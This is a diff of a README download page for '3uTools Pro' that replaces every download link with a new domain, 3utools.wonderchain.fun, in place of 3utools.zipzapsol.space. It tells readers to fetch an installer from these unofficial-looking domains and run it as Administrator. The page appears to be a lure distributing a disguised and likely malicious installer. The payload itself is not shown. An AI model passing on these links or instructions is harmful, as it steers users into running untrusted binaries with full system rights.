@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **3uTools Pro** for Windows.
 
 <p align="center">
-  <a href="https://3utools.zipzapsol.space/">
+  <a href="https://3utools.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-3uTools%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download 3uTools Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[3utools.zipzapsol.space](https://3utools.zipzapsol.space/)** |
-| **Full URL** | `https://3utools.zipzapsol.space/` |
+| **Direct link** | **[3utools.wonderchain.fun](https://3utools.wonderchain.fun/)** |
+| **Full URL** | `https://3utools.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — 3utools.zipzapsol.space](https://3utools.zipzapsol.space/)** (link above)
+1. Click **[Download — 3utools.wonderchain.fun](https://3utools.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://3utools.zipzapsol.space/"><strong>⬇ Download 3uTools Pro now</strong></a></p>
+<p align="center"><a href="https://3utools.wonderchain.fun/"><strong>⬇ Download 3uTools Pro now</strong></a></p>
 
 ---
 
